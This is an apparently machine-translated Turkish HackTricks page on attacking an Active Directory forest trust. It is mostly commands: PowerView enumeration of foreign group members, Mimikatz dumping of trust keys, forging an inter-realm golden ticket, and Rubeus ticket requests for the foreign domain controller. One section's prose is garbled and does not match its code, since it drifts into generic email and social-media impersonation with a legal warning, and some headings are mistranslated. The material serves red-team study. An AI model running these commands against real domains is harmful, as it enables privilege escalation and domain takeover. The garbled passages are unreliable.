# Harici Orman Alanı - Tek Yönlü (Gelen) veya çift yönlü

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>

Bu senaryoda harici bir etki alanı size güveniyor (veya ikisi birbirine güveniyor), bu yüzden onun üzerinde bir tür erişim elde edebilirsiniz.

## Sıralama

Öncelikle, **güveni** **sıralamanız** gerekmektedir:
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
Önceki numaralandırmada, **`crossuser`** kullanıcısının **`External Admins`** grubunda olduğu ve **dış etki alanının DC'sinde** **Yönetici erişimi** olduğu bulundu.

## İlk Erişim

Eğer diğer etki alanında kullanıcınızın herhangi bir **özel** erişimini **bulamadıysanız**, hala AD Metodolojisine geri dönüp **bir ayrıcalıksız kullanıcıdan ayrıcalık yükseltme** deneyebilirsiniz (örneğin kerberoasting gibi):

**Powerview fonksiyonlarını** kullanarak `-Domain` parametresini kullanarak **diğer etki alanını** numaralandırabilirsiniz:
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
## Kimlik avı

### Giriş yapma

Dış etki alanına erişimi olan kullanıcıların kimlik bilgileriyle düzenli bir yöntem kullanarak erişim sağlayabilirsiniz:
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID Geçmişi Kötüye Kullanımı

Ayrıca, bir ormanda güven ilişkisi üzerinden [**SID Geçmişi**](sid-history-injection.md) kötüye kullanılabilir.

Bir kullanıcı **bir ormandan başka bir ormana** taşındığında ve **SID Filtreleme etkin değilse**, diğer ormandan bir **SID eklemek mümkün** hale gelir ve bu **SID**, güven ilişkisi üzerinden kimlik doğrulama yapılırken kullanıcının **token'ına eklenir**.

{% hint style="warning" %}
Hatırlatma olarak, imzalama anahtarını aşağıdaki komutla alabilirsiniz:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
```
{% endhint %}

Mevcut alanın kullanıcısını taklit eden bir TGT'yi **güvenilir** anahtarla **imzalayabilirsiniz**.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Kullanıcıyı taklit etmek için tam yol

Bu yöntem, bir kullanıcının kimliğini taklit etmek için kullanılır. Aşağıdaki adımları izleyerek bu yöntemi uygulayabilirsiniz:

1. İlk olarak, hedef kullanıcının kimlik bilgilerini elde etmeniz gerekmektedir. Bu bilgiler, kullanıcının kullanıcı adı ve parolasını içerir.

2. Ardından, hedef kullanıcının kimlik bilgilerini kullanarak oturum açmanız gerekmektedir. Bu, hedef kullanıcının hesabına erişim sağlayacaktır.

3. Oturum açtıktan sonra, hedef kullanıcının kimliğini taklit etmek için bir dizi yöntem kullanabilirsiniz. Örneğin, hedef kullanıcının e-posta hesabına erişebilir, sosyal medya hesaplarını kontrol edebilir veya diğer çevrimiçi platformlarda onun adına işlemler gerçekleştirebilirsiniz.

Bu yöntem, hedef kullanıcının kimliğini taklit etmek için kullanılan bir dizi teknik içerir. Ancak, bu tür bir etkinlik yasa dışıdır ve başkalarının gizliliğini ihlal etmektedir. Bu nedenle, bu tür bir faaliyeti gerçekleştirmek yasal sonuçlar doğurabilir ve ciddi cezalara yol açabilir. Bu nedenle, bu tür faaliyetlerden kaçınmanız önemlidir.
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde çalışıyor musunuz**? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo'ya](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo'ya](https://github.com/carlospolop/hacktricks-cloud) PR göndererek paylaşın**.

</details>
